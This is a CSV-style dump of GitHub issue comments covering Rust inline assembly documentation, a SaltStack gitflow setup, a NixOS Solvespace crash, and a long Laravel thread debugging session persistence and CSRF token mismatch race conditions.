rust/rust-lang/29722/447486713,"I am closing out #53118 in favor of this issue and copying the PR here for the record. Note that this is from August, but a brief look seems to indicate the situation hasn't changed  The section on inline assembly needs an overhaul; in its present state it implies that the behavior and syntax is tied to  and the rust language in general. Pretty much the entire documentation is specific to x86/x86_64 assembly with the llvm toolchain. To be clear, I am not referring to the assembly code itself, which is obviously platform-specific, but rather the general architecture and usage of inline assembly altogether. I didn't find an authoritative source for the behavior of inline assembly when it comes to ARM target, but per my experimentation and referencing the ARM GCC inline assembly documentation, the following points seem to be completely off  The ASM syntax, as ARM/MIPS (and most other CISC?) use intel-esque syntax with the destination register first. I understood the documentation to mean/imply that inline asm took at&amp;t syntax which was transpiled to actual platform/compiler-specific syntax, and that I should just substitute the names of the x86 registers with that of the ARM registers only. Relatedly, the  option is invalid, as is it causes ""unknown directive"" errors when compiling. Adapting from the ARM GCC inline assembly documentation (for building against  with the  toolchain, it appears that even some basic assumptions about the format of inline assembly are platform-specific. In particular, it seems that for ARM the output register (second macro argument) counts as a register reference, i.e.  refers to the first output register and not the first input register, as is the case with the x86 llvm instructions. At the same time, other compiler-specific features are not present; I can't use named references to registers, only indexes (e.g.  is invalid). (Even for x86/x86_64 targets, the usage of  and  in the inline assembly example is very confusing, as it does not explain why those numbers were chosen.)  I think what threw me the most is the closing statement Which does not seem to be universally true. ",,False,False,29722
rust/rust-lang/29722/447646195,"A notion of intel vs at&amp;t syntax only exists on x86 (though there may be other cases I'm not aware of). It's unique in that they are two different languages sharing the same set of mnemonics to represent the same set of binary code. The GNU ecosystem has established at&amp;t syntax as the dominating default for the x86 world which is why this is what inline asm defaults to. You are mistaken in that it is very much a direct binding to LLVM's inline assembler expressions which in turn mostly just dump plaintext (after processing substitutions) into the textual assembly program. None of this is unique (or even relevant) to or about today's  as it is entirely platform-specific and completely meaningless beyond the x86 world. This is a direct consequence of the ""dumb""/simple plaintext insertion I described above. As the error message indicates the  directive is unsupported. This is an old and well-known workaround for using intel-style inline-asm with GCC (which emits att style) one would simply write  at the start of the inline asm block, then write some intel-style asm and finally terminate with  to set the assembler back into att mode so it correctly processes the (following) compiler-generated code once again. It's a dirty hack and I remember at least the LLVM implementation having had some weird quirks for a long time so it seems like you're seeing this error because it was finally removed. Sadly, the only correct course of action here is to remove the  option from rustc. Your observation is entirely correct, each platform makes up both its own binary format and its own assembly language. They are completely independent and (mostly) unprocessed by the compiler - which is the entire point of programming in raw assembler! Sadly there is quite a big mismatch between the inline asm implementation of LLVM that rustc exposes and the implementation of GCC (which clang emulates). Without a decision on how to move forward with  there is little motivation in improving this - besides, I outlined the major options a long time ago all of them have clear drawbacks. Since this does not seem to be a priority you're probably going to be stuck with today's  for a few years at least. There are decent workarounds  rely on the optimizer to produce optimal code (with a little nudging you can usually get exactly what you want without ever writing raw assembly yourself) use intrinsics, another quite elegant solution which is better than inline asm in almost every way (unless you need exact control over instruction selection and scheduling) invoke the  crate from  to link a C object with inline asm basically just invoke any assembler you like from , using a C compiler may seem like overkill but saves you the hassle of integrating with the  system    These workarounds apply to all but a small set of very specific edge cases. If you hit one of those (luckily I haven't yet) you're out of luck though. I agree that the documentation is quite lackluster but it's good enough for anyone familiar with inline asm. If you aren't, you probably should not be using it. Don't get me wrong - you should definitely feel free to experiment and learn but as  is unstable and neglected and because there are really good workarounds I would strongly advise against using it in any serious project if at all possible. ",,False,False,29722
rust/rust-lang/29722/447646989,"You can also invoke the  crate from  to build plain assembly files, which gives the maximum amount of control. I strongly recommend doing exactly this in case the two ""workarounds"" above this do not work for your use-case. ",,False,False,29722
rust/rust-lang/29722/447662565,"@friend wrote I mean, not entirely out of luck. You just have to use Rust's . I have an edge case that none of your listed workarounds cover here. As you say, if you're familiar with the process from other compilers it's mostly fine. (I have another use case I would like to teach systems programming computer architecture and stuff using Rust instead of C someday. Not having inline assembly would make this much more awkward.) I wish we would make inline assembly a priority in Rust and stabilize it sooner rather than later. Maybe this should be a Rust 2019 goal. I am fine with any of the solutions you list in your nice comment earlier I could live with the problems of any of them. Being able to inline assembly code is for me a prerequisite to writing Rust instead of C everywhere I really need it to be stable. ",,False,False,29722
rust/rust-lang/29722/447672333,"Please write  a Rust 2019 blog post and express this concern. I think if enough of us do that, we can influence the roadmap. ",,False,False,29722
rust/rust-lang/29722/448037987,"To clarify my comment above - the problem is that the documentation does not explain just how ""deeply"" the contents of the  macro are parsed/interacted with. I'm familiar with x86 and MIPS/ARM assembly but presumed that llvm had its own assembly language format. I've used inline assembly for x86 before, but was not clear on to what extent the bastardization of asm to brige C and ASM went. My presumption (now invalidated) based off the wording in the rust inline assembly section was that LLVM had its own ASM format that was built to mimic x86 assembly in either at&amp;t or intel modes, and necessarily looked like the x86 examples shown. (What helped me was studying the expanded macro output, which cleared up what was going on) I think there needs to be less abstraction on that page. Make it clearer what gets parsed by LLVM and what gets interpreted as ASM directly. What parts are specific to rust, what parts are specific to the hardware you are running on, and what parts belong to the glue that holds them together. ",,False,False,29722
rust/rust-lang/29722/448718803,"Recent progress on cross-language LTO makes me wonder if some of the downsides of this avenue can be reduced, effectively inlining this ""external assembly blob"". ",,False,False,29722
rust/rust-lang/29722/448732609,"Even if this works, I don't want to write my inline assembly in C. I want to write it in Rust. -) ",,False,False,29722
rust/rust-lang/29722/448734015,"You can compile and link  and  files directly (see for example this crate), which in my book are far enough from C. ) ",,False,False,29722
rust/rust-lang/29722/448738023,I believe this is not currently feasible as cross-language LTO relies on having LLVM IR and assembly would not generate this. ,,False,False,29722
rust/rust-lang/29722/448765777,You can stuff assembly into module level assembly in LLVM IR modules. ,,False,False,29722
rust/rust-lang/29722/479977512,"Does anyone know what the most recent proposal/current status is? Since the theme of the year is ""maturity and finishing what we started"", it seems like a great opportunity to finally finish up . ",,False,False,29722
rust/rust-lang/29722/479986590,Vague plans for an new (to be stabilized) syntax were discussed last February  to those notes @friend and @friend signed up to write an RFC. ,,False,False,29722
salt/saltstack/236/2241610,"Hi Thomas, I want to make progress... gitflow [0] is next thing to attack. Here's how to do it... it's trivial as you can see (of course, you don't clone but use the orig repo) sa@friend/tmp$ git clone  into salt... remote Counting objects 7943, done. remote Compressing objects 100% (2398/2398), done. remote Total 7943 (delta 5480), reused 7907 (delta 5450) Receiving objects 100% (7943/7943), 1.22 MiB | 756 KiB/s, done. Resolving deltas 100% (5480/5480), done. sa@friend/tmp$ cd salt/; git branch -a * master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/highstate   remotes/origin/master (master u=) sa@friend/tmp/salt$ git flow init -d Using default branch names.  Which branch should be used for bringing forth production releases?    - master Branch name for production releases [master]  Branch name for ""next release"" development [develop]   How to name your supporting branch prefixes? Feature branches? [feature/]  Release branches? [release/]  Hotfix branches? [hotfix/]  Support branches? [support/]  Version tag prefix? []  (develop) sa@friend/tmp/salt$ git branch -a * develop   master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/highstate   remotes/origin/master (develop) sa@friend/tmp/salt$ git push -u origin develop  Finally go to github's admin interface for salt and make develop the default branch. We're done... best of both worlds, stable master from now on, no more direct pushes to master plus we can keep the attitude of fast progress/experimenting because wild coding monkeys can start feature branches and fire away ) [0] on Debian  or from source ",,False,False,236
salt/saltstack/236/2768011,"markusgattol, I am all for this, and it is the next thing I will set up. Sorry I have been slow on the uptake, been a busy couple of days! ",,False,False,236
salt/saltstack/236/2824015,branch was created on the 17th and set as default in GitHub -- closing. ,,False,False,236
nixpkgs/NixOS/32393/279908954,"Issue description Using any of the following file menu commands opening a file dialog window will crash Solvespace on KDE Plasma  Open... Save Save As... Export Image... Export 2d View... Export 2d Section... Export 3d Wireframe... Export Triangle Mesh... Export Surfaces... Import...  If Solvespace is started from a konsole, one gets the following error message after the program crash A similar, maybe the same, problem was already discussed in solvespace/solvespace#215, but could not be solved. In addition, other programs experience(d) similar problems in NixOS, e.g., #24943. Steps to reproduce  Install Solvespace by adding  to the list of  in  and running  Log in KDE Plasma Open a Konsole Run  Open a file dialog by, e.g., selecting File -&gt; Save...  Technical details  system  host os  multi-user?  sandbox  version  channels(root)  nixpkgs   ",,False,False,32393
nixpkgs/NixOS/32393/349786602,"You opened the issue originally in the right location. The author of solvespace should fix his program to report a specific error message and not crash inside one of its dependent libraries. This is not a NixOS problem. Solvespace is developed on a particular operating system and as a result it only is portable to that system. If you want to make the program work on NixOS, you need to fix the program. The observed behaviour does not warrant a change in NixOS. The solvespace people refer to ""Building on Linux"". This seems to suggest that they think it is portable across Linux systems, while it obviously is not. Portable code runs unmodified and without patches across a wide range of *nix based systems. I suggest you run it inside a Docker container or inside a Debian VM until they fix it. ",,False,False,32393
nixpkgs/NixOS/32393/349827946,"For what it is worth, williammpratt's attitude here is not representative of the NixOS community's attitude toward other software. The user has since been blocked from the NixOS organization. ",,False,False,32393
nixpkgs/NixOS/32393/350485938,Looks like  is missing in the derivation. ,,False,False,32393
nixpkgs/NixOS/32393/350487178,I added this hook here 9c89e52ff20fc0f569afe8126e7f442ca575a676 ,,False,False,32393
nixpkgs/NixOS/32393/352302042,This issue was rediscovered in #32651. Backported in 3bee0c2f618df4197bc146259109adbf70a999d2. ,,False,False,32393
framework/laravel/8172/64530609,"6777 and #5416 still seem to be an issue, even for drivers other than .  // cc @friend, @friend, @friend, @friend, @friend, @friend, ",,False,False,8172
framework/laravel/8172/86525663,"We are experiencing token regenerating issue on Redis, I don't think it would be lock issue because redis is single thread and atomic, I used the method suggested in #6777 to debug and here is the log you can see that the token is regenerated out of nowhere. one more thing, when I was testing the application (sending many concurrent requests) on another tab I was not able to login! ",,False,False,8172
framework/laravel/8172/86527608,maybe related to this said by @friend in #5416 ,,False,False,8172
framework/laravel/8172/90619857,I can confirm this is happening using the file driver as well as the memcached driver. ,,False,False,8172
framework/laravel/8172/90630947,"Ok I added some code to log when a session starts when it stops (saves) and when the cookie is sent and here is the result as you can see in the middle the session id is regenerated because I have tried logging in when sending concurrent requests, and as you can see while the session id is changed the other concurrent requests are using the prior id so on next response the cookie is rewrote and you're logged out. any idea what can make this happen? ",,False,False,8172
framework/laravel/8172/90951875,"After testing on multiple machines / configurations, I was able to notice that it happens only using homestead without nfs folder sync. ",,False,False,8172
framework/laravel/8172/91192639,@friend why is this closed? ,,False,False,8172
framework/laravel/8172/91429821,"I tested this on Homestead v2.5 on my Windows 7 64bit box using VMWare. I tried using session drivers ,  and . I could not replicate despite doing thousands of AJAX requests. I'll keep trying some other methods... ",,False,False,8172
framework/laravel/8172/91510730,"I Taylor and I can't replicate this either, but it seems there are a good number of people that seem to have having this issue. ",,False,False,8172
framework/laravel/8172/91520053,"Could it have something to do with a change or bug in the latest PHP version? I'm using PHP 5.6.7 for both local development and my servers, and I have this issue on both. The rest of the setup is totally different (Windows/Debian, PHP server/nginx). ",,False,False,8172
framework/laravel/8172/91556277,@friend - the issue has been known since at least Dec 2014. So it was earlier than PHP 5.6.4 But there must be some combination of PHP/Server/Laravel versions that is causing it. Or perhaps even the OS or Server. Perhaps if more people with the issue can post their system configs/versions - we might see a common setup between them that we can use to narrow down the issue? ,,False,False,8172
framework/laravel/8172/91563382,I've tried further on a new Forge DigitalOcean box (lowest box - 512mb ram) - running PHP 5.6.7. I also tried with browsers Chrome41 + IE11 Still cant replicate ( ,,False,False,8172
framework/laravel/8172/91569267,"Its happening for me under xampp 3.2.1, windows 7, php 5.6, mysql 5.5.34, apache 2.4.7 As well on windows 8.1, php 5.6, mysql 5.6.24, nginx 1.7.12 ",,False,False,8172
framework/laravel/8172/91575496,@friend @friend - what browsers are you testing with? (I know it shouldnt matter - but I'm trying to think of every possibility) ,,False,False,8172
framework/laravel/8172/91580913,Firefox and Chrome. ,,False,False,8172
framework/laravel/8172/91588778,@friend - which exact browser versions are you using? And what code are you running to cause this issue? If you run the code in  do you get the problem? ,,False,False,8172
framework/laravel/8172/91597307,Home Pc Firefox 37.0.1 Chrome 41.0.2272.118 m Work PC Firefox Developer 39.0a2 (2015-04-06) Chrome 41.0.2272.118 m I'll test the code when I get home. It happens very inconsistently with both the general Auth + Sentinel. ,,False,False,8172
framework/laravel/8172/91666941,"My PC is running Windows 8.1, PHP 5.6.7, the PHP web server and Chrome 41.0.2272.118 m (64-bit). My first server is running Debian Sid, PHP 5.6.7 and nginx 1.6.2. My second server is running Debian Jessie, PHP 5.6.7 and nginx 1.6.2 also. @friend I've tried the code of issue #6777. I've run ~2500 queries without any mismatch (I checked the logs). I've also created a new Laravel 5 project and copied the added code into it, but can't reproduce it there either. Using my own Naxiz/L5-CSRF-TestCase@friend seconds after it, I get an exception after just 2 clicks. ",,False,False,8172
framework/laravel/8172/91795854,The #6777 was created on my local OSX dev machine using homestead (don't remember the version though). We initially found the problem on our DigitalOcean servers created through Forge. ,,False,False,8172
framework/laravel/8172/92048584,"@friend @friend I can easily replicate this error on our server and on my local machine, they have different versions of php different os, etc., I use laravel 4.1, on login form I simply click or enter the submit button 20-30 times repeatedly fast. as you know even on login the csrf token does not change, but I get a token mismatch error on this situation. ",,False,False,8172
framework/laravel/8172/92349761,@friend @friend @friend - can you visit this server - and tell me if you can make it fail  is using the exact fork of  - on a DigitalOcean server using Forge. I still cant replicate - but I'm wondering if you can make it fail? ,,False,False,8172
framework/laravel/8172/92470607,"We've been battling with this puzzle for 2 months now. On our busy production system, we get 2-3  per 24-hr period upon a simple form submission. During this same period we have ~150 succeed without issue. We've implemented very detailed debug logging and one pattern has emerged, which is browser related. Over the last 2 months, with 2-3 issues per-day, only these browsers have triggered the issue (by quantity, predominantly IE 11 and Android 4.4.* Chrome 41) Related SO question  have a Forge managed Linode with LEMP (nginx 1.6.2, php 5.6.6-1+deb.sury.org~trustyplus one and Laravel 5 up-to-date). So far, we have been unable to replicate in our testing on the said browsers. Here's an example log run for IE 10 ",,False,False,8172
framework/laravel/8172/95494281,Ping @friend @friend @friend @friend. Can you please see if you have the problem on this server   cant replicate - but I'm wondering if you can? Might help pinpoint the issue. ,,False,False,8172
framework/laravel/8172/95539359,"As far as I can see on that server specifically the issue doesn't seem to occur. But another issue that could be related is the fact the laravel session cookie seems to expire randomly, when it does a new session gets created like when you logout so you would lose that token? ",,False,False,8172
framework/laravel/8172/96552913,"@friend @friend @friend @friend @friend @friend  After a lot of investigation on the issue in our company, I came to this result, I hope it helps, first of all here is our environment specifications PHP 5.3.3 LARAVEL 4.1 OS centos 6 on server and os x mavericks in development environment APACHE 2 MYSQL 5.6.19 REDIS 2.4.10 PREDIS  0.8.* First of all it seems that the TokenMistmatch exception occurs in a varied different conditions, I nearly investigated all of them and was able to solve some of them, some depends on the logic behind the session and some can be bugs. In the following i will explain each situation that I have faced. 1. Expired sessions Let's say you have configured your session for 3 hours a user opens up a form and for some reason he leaves the computer (getting a cup of coffee) so after 3 hours when the session is expired he tries to submit a form and gets a token exception. this is why everyone once in while gets a token errror regardless of how much stable the application is, I can imagine of 2 ways to prevent it and they're renewing the session cookie using ajax on a timely basis, or increasing the session expire time to a considerable amount of time. 2. Concurrent requests when session is expired Sometimes on the load of your first page concurrent requests happen, for example the user has two different tabs open on chrome and when he reopens chrome chrome sends the requests simultaneously or you may have multiple concurrent ajax request on the load of the first page of your application. so note that the session cookie is received after the first response is received but you may send the next request before this happens and therefore you will get a new session (new cookie) on each requests, this can lead to token exception if one of these requests populates a form. you can prevent this scenario based on it's source, for example if the ajax request are causing the problem and you do not use session in ajax responses, you can disable sending the session cookie if the request is ajax, in the second scenario (clicking the submit button multiple times) you can simple disable the button once it's submitted. 3. Concurrent requests on login When login is occurred, laravel for security reasons changes the session id, copy the session data and DESTROYS THE LAST SESSION so let say for some reason when logging in concurrent requests happen (clicking the login button multiple times) so the session id would be regenerated multiple times and DESTROYS the last generated sessions in the server side, as some of these requests still use the prior session id (which does not exist in the server side anymore) it leads to regenerating the CSRF token, please note that normally laravel does not regenerate the token on login if it can find the token in guest (not logged in) session, but in this case as the guest session is destroyed as a result it will regenerate the token and it can result to token exception in other requests that are using the original token. also note that not only this issue can result in token exception it can also result in the user being logged out after one request, because the concurrent requests can change the logged in session. I solved this issue by changing one line in the laravel code, in  passing true to the migrate method of the session store will result in destroying the session on the server after migration, so now the data will remain on the server and destroyed on their expire time rather than on this request and it will solve the issue. I don’t know if we can call this a bug in laravel, but I guess we can come up with a better solution for this. 4. Browsers After investigating the logs it turned out that some of these token exceptions were because of the user’s browser not accepting the session cookie,I saw it the most on iOS Safari, I believe this is something we can do nothing about it. 5. Redis bug Some of the token exceptions on our sever was because of redis, for some reason laravel could not read the session data from the redis server when opening the session so it would result to the regeneration of the CSRF token. it was happening randomly on our server, so I tried changing the session driver and this type of exceptions faded away. I tried database, apc and file drivers and none produced this issue. I have not yet found what is causing the bug but i think it can be a bug with redis or the predis library. (as you know laravel 4.1 is not using the latest version of predis because of compatibility issues). Okay these are my experiences of the last 2 month working on this issue. I hope it may change your point of view regarding solution to this issue, the most important thing is that the token exception does not happen because of one reason it’s can be a result of multiple issue. please share with me if you have had similar incident or you have something new. ",,False,False,8172
framework/laravel/8172/96778124,We're not interested in issues with 4.1. We're not interested with issues with PHP 5.3. ,,False,False,8172
framework/laravel/8172/96778166,We want replication on Laravel 5.x. ,,False,False,8172
framework/laravel/8172/96778388,This is because it doesn't pose a security issue so we have no intention to patch it on 4.1.x. ,,False,False,8172
framework/laravel/8172/96779876,"@friend I'm aware but I was trying to lighten things up, wondering if anyone can test the similar situations on 5, I'm also upgrading the laravel of my application so then I can try again with L5. ",,False,False,8172
framework/laravel/8172/96802831,@friend Thank you. ) ,,False,False,8172
framework/laravel/8172/96989320,"@friend I can't reproduce it on your server. I also set up a new server at DigitalOcean and can't reproduce it there either. I thought it may have something to do with the time zone, because it's Europe/Amsterdam on all machines I can reproduce the issue on, but not on DigitalOcean, but after changing it I still can't reproduce it. ",,False,False,8172
framework/laravel/8172/97375124,"I got the same issue, I get some data that appear and desappears randomly, I'm guessing that it's from  the ajax long polling in my app. ",,False,False,8172
framework/laravel/8172/97388553,"@friend Can you please provide your laravel version, php version, session driver and the driver version and the exact way you are able to replicate this issue (even with sample code). thanks. ",,False,False,8172
framework/laravel/8172/97403170,"Im not sure if this related to this issue, but my session variables are not saved in the file session. I tried to quickly reproduce it with the following code in the latest Laravel (5.1-dev) In the example i except to get a filled  with 2 messages, but unfortunately i do not. When i try this exact example within Laravel 5.0.22 its working properly. After some debugging and digging within the  it should save all attributes (with ). But somehow the function is not triggered, but the if-loop requirements are all valid. ",,False,False,8172
framework/laravel/8172/97412142,@friend Laravel Framework version 4.2.17 PHP Version 5.5.12 Session driver 'file' This is a sample code of my long polling method in a regular Controller ,,False,False,8172
framework/laravel/8172/97428277,Laravel 4.2 is not supported. ,,False,False,8172
framework/laravel/8172/97430568,Yes - but this bug first appeared in 4.2 (or at least it was first reported then) - and has carried on into 5.0 - so it is still relevant to know of issues in 4.2. This bug is so elusive - yet it is clearly out there (with some many different server configs etc etc) - that the more info we get the better. We need as many reports as we can get. And knowing the bug exists in 4.2 helps to drill down the issue. There is obviously something common between 4.2 and 5.0 causing the bug? ,,False,False,8172
framework/laravel/8172/97447563,"@friend as @friend said the problem is common with v5.0, and what about applications running under Laravel 4.2 like my application which is production. ",,False,False,8172
framework/laravel/8172/97448210,"We are not supporting 4.2. If we do finally fix this, we will only be merging the fix into 5.0 or 5.1, depending in which one is stable at the time. ",,False,False,8172
framework/laravel/8172/97477112,So I hope people can help to find the bug asap otherwise we all have to migrate to L6.0 or 7.0 because of this bug! ,,False,False,8172
framework/laravel/8172/99112012,"I was able to reproduce this bug. Laravel 5.0 PHP 5.6 (provisioned by Forge) Session drivers redis, file The race condition occurred due to images pointing to dynamic URL (image generation was handled by Laravel). Browser was processing the request, but also trying to load the images. The main request was updating the session, but on some cases the requests to images were resetting it. Consider this simple timeline R1 (SS)-------------(DP)-----------(SC) R2 --------------(SS)---------------------------(SC) Legend SS - session starts - data is read from the storage DP - data is put to the session SC - session is closed - data is written to the storage R1 - first request R2 - second request Since the second request has the old data it's writing them back to storage. I see two solutions for this  simple and naive - save session data only when they were changed session locking  In my case I've simply disabled session saving for image requests. What do you think about it? ",,False,False,8172
framework/laravel/8172/99237513,"That seems like a good optimisation to make anyway, though if people are storing large objects in the session, could be slow to check for changes. ",,False,False,8172
framework/laravel/8172/99238658,"@friend If we make that optimisation, it might be an idea to ditch the serialise/unserialise stuff and not support putting objects in the sessions. It seems like a silly idea to do that anyway? ",,False,False,8172
framework/laravel/8172/99255755,"To check for changes you could md5 the serialized array. On Tuesday, May 5, 2015, Graham Campbell notifications@friend.com wrote ",,False,False,8172
framework/laravel/8172/99350880,"I had another idea for this - make a flag (e.g  ) ), every call to ,  etc will mark it to . If so - session should be saved. Does this make sense? ",,False,False,8172
framework/laravel/8172/99409729,"Yeh, I guess. I was hoping for an optimisation where we could break out before we even serialised anything, since the serialisation process could actually take longer than storing the session in some cases. ",,False,False,8172
framework/laravel/8172/99409995,"That wouldn't work for objects. People can modify them by reference, so they never hit the put or push methods. ",,False,False,8172
framework/laravel/8172/99411657,Maybe relevant  references the WriteCheckSessionHandler and a note ,,False,False,8172
framework/laravel/8172/99417724,"Hmm, that's a very important point. ",,False,False,8172
framework/laravel/8172/99928989,"There is this report on SO  cacheclear Flushes User Sessions. Is this Intended?"" It affects Redis according to the post. Might be related? i.e. we've been searching for session issues - but might be a related cache issue as well? ",,False,False,8172
framework/laravel/8172/99930383,"Yes. If you're using the same store for sessions as for cache, expect clearing the cache to destroy ALL data in the store. ",,False,False,8172
framework/laravel/8172/100332824,@friend I'm the one who posted that (now deleted) question on SO. I was just looking for the confirmation Graham provided above. It wasn't related to the issue you guys are discussing here. ,,False,False,8172
framework/laravel/8172/102999611,"Yea happening to me as well. Same browser, two different environments one staging server, one my local. Everything works fine on local, however staging environment writes new session to file at every request. Both environments are Ubuntu 15, with latest servers and PHP-FPMs installed. From time to time my local messes up as well. But miraculously it fixes itself. None of the environments have more than 1 request per 10 secs ) So can't be a load/race-condition issue. ",,False,False,8172
framework/laravel/8172/103005473,"Okkk... Right now, I have this problem in both environments and I decided to dig in with XDebug. I will be posting my discoveries here. Note I am testing the case in both Chrome and Firefox (latest versions as of now). I have Firebug's latest beta version installed with Firefox to get latest features such as CSS-Maps etc. I also have my app under  and  domains set locally of course. I have set . I cleared all my cookies from both browsers before starting the tests and ran commands  +  + . Currently my observations are as following  Chrome console only shows  cookie only. No  cookies whatsoever. Firefox on other hand shows both  and  cookies. Both browsers renew these cookies and write new session file everytime I reload the page.     When debugged with XDebug, for line   actually detects no  cookies    as a value to  there. Same goes for Chrome as well  So I guess, none of the browsers actually detect  cookie. And if that cookie is not present, new session cookie will be written. Am I missing anything so far or doing something wrong, @friend  @friend ? ",,False,False,8172
framework/laravel/8172/103008369,"Additionally, I gathered cookies are not allowed to be set in top-level-domains (such as ) in Chrome - and from specs-viewpoint, that's the case. Firefox on the other hand, allows setting them for TLDs. Although my code is behind  domain, which isn't a TLD, I will setup some bogus real-looking domain and test it again. ",,False,False,8172
framework/laravel/8172/103011549,"@friend @friend  I just noticed - please check the screenshot from Firefox above and notice domains of  cookie. It is not the domain app works with, but rather . ",,False,False,8172
framework/laravel/8172/103012908,Is this only happening when you're using environments? Try hard coding all your config. ,,False,False,8172
framework/laravel/8172/103013330,"Question I am not Symfony guru, but as I am currently searching for the cause of  cookie being set from  domain in some cases no matter what you do, I stumbled upon  unit-test method in Symfony. Question is is there a chance Symfony resolves the name (our domains, in case of locals and staging areas, our rather FAKE domains which always resolve to 127.0.0.1) to IP address and when it finds out that IP address is rather local, sets  cookies under ? It's just a hunch, nothing substantial to back it up right now. @friend  Ok, I will hard-code configs. I was using  file. ",,False,False,8172
framework/laravel/8172/103013520,Meanwhile my  file  ,,False,False,8172
framework/laravel/8172/103014137,"We're already aware of concurrency issues with the environment system. I'm wondering if this session issue is actually just this same issue, applied. ",,False,False,8172
framework/laravel/8172/103014373,"@friend Just a word of warning might want to take down that screenshot of your .env file its got your Google and Twitter OAuth details in, might want to obfuscate them before uploading it again. ",,False,False,8172
framework/laravel/8172/103014526,@friend Bit late for that. They'll need invalidating. ,,False,False,8172
framework/laravel/8172/103014653,"No worries folks, they are for dev purposes, can be invalidated in a whim. ) ",,False,False,8172
framework/laravel/8172/103015122,"@friend , I changed to  in  config file. Results are the same. ",,False,False,8172
framework/laravel/8172/103015944,"I'm meaning, don't use the env system at all for any config and see what happens. ",,False,False,8172
framework/laravel/8172/103019015,"@friend fixed the problem. Value  inside  file must be set correctly. I set it the same value as my fake real-looking domain - in my case  - and session is working now. Setting that value as  and accessing the app from  domain does NOT work in Chrome (as per aforementioned reason cookies are not designed for TLDs and Chrome follows that rule), but works in Firefox. Setting it to  (fake domain I used for my project in general) works as well. To those who work with Socialite, be warned since Twitter doesn't accept  and G+ doesn't accept unreal domains like   in callback-URIs, you should be working with real-looking domains to avoid all these problems altogether. ",,False,False,8172
framework/laravel/8172/103019758,Or we could just set that line like  and move that setting to dotEnv? ,,False,False,8172
framework/laravel/8172/103021053,"@friend - setting the domain to solve your session problem doesnt sound like rest of the problem the rest of us are having. We have random session fails, sometimes under heavy load from AJAX. But our sessions work most of the time. Yours doesnt - so it would seem to be a different issue than discussed here unfortunately. ",,False,False,8172
framework/laravel/8172/103021486,"@friend Yea, I think it might be. That might be related to that ""race-condition"" topic mentioned before, I guess. Or something related to  not locking file before reading (which would clearly break concurrency in session handling). @friend , I believe my posts might have diverted this discussion away from original topic/problem at hand. If you guys believe this is the case, please feel free to delete my posts and put one tiny notification for those who would have the same problem I did today. No need to clutter this topic, if my posts are close to irrelevant. ",,False,False,8172
framework/laravel/8172/103022293,I suspect that's caused by the env system. Can anyone confirm this? ,,False,False,8172
framework/laravel/8172/103023001,@friend - if people run  - would they still be subjected to env system concurrency issue? I'm guessing not? ,,False,False,8172
framework/laravel/8172/103024475,True. Are people still experiencing this after caching the config? ,,False,False,8172
framework/laravel/8172/103024743,"That is, with drivers other than file. People were complaining of issues with redis too? ",,False,False,8172
framework/laravel/8172/103025290,Ping @friend @friend @friend @friend @friend Are you running Laravel 5? If yes - are you using ? If not - can you try and use that feature (which is helpful in production anyway) and see if the problem continues? ,,False,False,8172
framework/laravel/8172/103159242,"@friend that would make sense. If the putenv was being unset for that second request, the Encrypter wouldn't be using the correct app key to decrypt the cookie. Here are the relevant threads ",,False,False,8172
framework/laravel/8172/103165389,We aren't using configcache at all. Not any other caching in our development environments. Although since I switched to redis the issue has stopped happening. ,,False,False,8172
framework/laravel/8172/103169230,"I think this is pretty much sorted. To avoid this bug, use config caching and a driver that's not ""file"". ",,False,False,8172
framework/laravel/8172/103169388,"The ""file"" driver was never intended for large scale production use. ",,False,False,8172
framework/laravel/8172/103201709,"It does apparently fail with a few concurrent AJAX requests (on a single page), which has nothing to do with production... ",,False,False,8172
framework/laravel/8172/103204215,What does. Does redis fail after using configcache first? ,,False,False,8172
framework/laravel/8172/103204976,The file driver. ,,False,False,8172
framework/laravel/8172/103207551,"We already know that's broken, and it's not getting fixed. That wasn't the purpose of this issue. Look at the very top. ",,False,False,8172
framework/laravel/8172/103207619,,,False,False,8172
framework/laravel/8172/103208185,"I opened this to investigate drivers other than the file one because there's no way they should be failing, and that seems to be resolved. Taylor already rejected the overly strict file driver fixes. The recommended advice would be to not use the file driver. ",,False,False,8172
framework/laravel/8172/103217068,"I discovered the bug using the database driver, so it’s certainly not only the file driver. It seems it doesn’t matter whether is use the file or database driver. From Graham Campbell [mailtonotifications@friend.com]  Sent 18 May 2015 2254 To laravel/framework Cc Louis Matthijssen Subject Re [framework] [5.0] Session Persistance Issues (#8172) I opened this to investigate drivers other than the file one because there's no way they should be failing, and that seems to be resolved. Taylor already rejected the overly strict file driver fixes. The recommended advice would be to not use the file driver. — Reply to this email directly or view it on GitHub  .  ",,False,False,8172
framework/laravel/8172/103219023,@friend did you also try caching your config? ,,False,False,8172
framework/laravel/8172/103220551,"I did, and I got a TokenMismatchException after just a few submits using my own test case. These are not even AJAX or concurrent connections. Unfortunately I don’t have much time to look into this issue myself at the moment, I’ll report back if I find anything useful later. ",,False,False,8172
framework/laravel/8172/103228409,@friend so given that it seems to remain unclear whether this is related to dotenv. ,,False,False,8172
framework/laravel/8172/103617367,"@friend As I said, we're not interested in the file driver. We already know it's limited. ",,False,False,8172
framework/laravel/8172/104642681,"I'm using config caching, but still I have session persistence issues. Session in not being stored sometimes (randomly). Both on  and  drivers. ",,False,False,8172
framework/laravel/8172/104643118,"This is causing us quite a lot of headache, days of debugging and the problem turns out to be a session handing in laravel / ",,False,False,8172
framework/laravel/8172/104757988,What driver? ,,False,False,8172
framework/laravel/8172/104758473,We tried both  and ,,False,False,8172
framework/laravel/8172/104758614,plus config caching enabled ,,False,False,8172
framework/laravel/8172/104758722,"To add to the pain, issue is intermittent. So we get 3 invalids in 30 tries. ",,False,False,8172
framework/laravel/8172/104758773,3 invalid what? ,,False,False,8172
framework/laravel/8172/104758795,@friend how rapid are requests? Are you making them in quick succession or are they spaced out? ,,False,False,8172
framework/laravel/8172/104760847,"@friend knows better, I've been following development only from the managers perspective. @friend  no pattern there really. lets say 5 secs &lt;-&gt; 15 secs. I also noticed that on windows+chrome combination it was easier to reproduce problem than on mac+chrome, but this could have been pure coincidence. Also number of users/sessions seemed to have worsened the problem. @friend bad wording on my part, we store specific key in the user session. In rare occasions 3 out of 30 this wasn't set correctly. But as I said @friend knows better, so lets wait for his insight. ",,False,False,8172
framework/laravel/8172/104761116,"@friend I'm having this issue with the  driver, also with the config caching. Also, there is at least 5 seconds between the requests but it still happens. ",,False,False,8172
